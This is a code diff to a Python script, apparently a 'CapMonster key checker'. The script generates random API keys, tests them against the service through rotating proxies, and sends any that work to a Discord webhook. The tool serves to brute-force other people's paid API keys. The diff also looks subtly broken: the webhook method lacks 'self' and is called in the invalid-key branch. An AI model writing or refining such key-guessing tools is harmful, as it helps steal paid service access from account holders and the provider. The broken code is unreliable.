@@ -19,7 +19,13 @@ class CapMonsterChecker:
     def __init__(self, keys):
         self.keys = keys
 
-
+    def send_webhook(key, balance, proxy):
+        webhook = DiscordWebhook(url=web)
+        embed = DiscordEmbed(title="Valid CapMonster Key",
+                             description=f"**Key:** *__{key}__**\n**Balance:** *__{balance}__*\n**Proxy:** *__{proxy}__*\n",
+                             color="000000")
+        webhook.add_embed(embed)
+        response = webhook.execute()
 
     def Check(self, proxies):
         print(f"{success}Starting Checker With {len(self.keys)} Keys And {len(proxies)} Proxies!")
@@ -52,6 +58,7 @@ class CapMonsterChecker:
                             errorCode = checkResp.json().get('errorCode')
                             if errorCode is not None:
                                 print(f"{fail}Invalid Key : {key} | Proxy : {proxy}")
+                                CapMonsterChecker.send_webhook(key, balance, proxy)
                             else:
                                 print(f"{fail}Error Checking Key : {key} | {checkResp.json()} | Proxy : {proxy}")
                 else:
@@ -66,16 +73,10 @@ class CapMonsterChecker:
 num_keys = int(input(f"{info}Enter The Number Of Keys You Want To Generate: "))
 web = (input(f"{info}Enter Webhook Where Valid Keys Get Sent To: "))
 
-def send_webhook(key, balance, proxy):
-    webhook = DiscordWebhook(url=web)
-    embed = DiscordEmbed(title="Valid CapMonster Key",
-                         description=f"**Key:** *__{key}__**\n**Balance:** *__{balance}__*\n**Proxy:** *__{proxy}__*\n",
-                         color="000000")
-    webhook.add_embed(embed)
-    response = webhook.execute()
+
 
 def generate_keys():
-    hex_chars = '0123456789abcdefghijklmnopqrstuvwxyz'
+    hex_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
     keys = []
     for i in range(num_keys):
         key = ''
